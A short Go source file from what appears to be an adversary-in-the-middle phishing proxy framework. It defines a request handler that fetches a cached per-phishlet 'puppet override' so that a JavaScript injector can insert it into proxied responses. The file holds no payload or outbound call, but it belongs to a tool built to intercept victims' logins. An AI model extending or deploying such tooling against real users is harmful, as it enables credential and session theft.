package request

import (
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type puppetOverrideSource interface {
	GetOverride(phishletName string) string
}

// PuppetOverrideResolver populates ctx.PuppetOverride from the cached puppet
// telemetry so JSInjector can inject it into the response. Nil-safe — if
// Source is nil or the phishlet has no cached override, this is a no-op.
type PuppetOverrideResolver struct {
	Source puppetOverrideSource
}

func (h *PuppetOverrideResolver) Name() string { return "PuppetOverrideResolver" }

func (h *PuppetOverrideResolver) Handle(ctx *aitm.ProxyContext, _ *http.Request) error {
	if h.Source == nil || ctx.Phishlet == nil {
		return nil
	}
	ctx.PuppetOverride = h.Source.GetOverride(ctx.Phishlet.Name)
	return nil
}

var _ proxy.RequestHandler = (*PuppetOverrideResolver)(nil)
